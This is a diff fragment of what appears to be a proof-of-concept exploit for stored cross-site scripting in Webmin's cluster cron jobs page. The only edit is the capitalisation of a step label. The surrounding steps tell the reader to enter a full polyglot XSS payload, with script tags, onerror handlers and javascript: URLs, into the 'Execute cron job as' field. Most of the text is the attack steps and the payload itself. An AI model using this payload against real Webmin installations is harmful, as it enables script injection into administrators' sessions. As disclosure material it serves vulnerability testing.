@@ -8,7 +8,7 @@
 # Step 2 : Navigate to webmin tab.
 # Step 3 : Go to cluster.
 # Step 4 : Go to cluster cron jobs.
-# Step 5 : Click on create a new cluster cron job.
+# Step 5 : Click on create a new Cluster Cron Job.
 # Step 6 : In the input field "Execute cron job as ".
 # Step 7 : Insert the following payload.
 ''' javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)// 
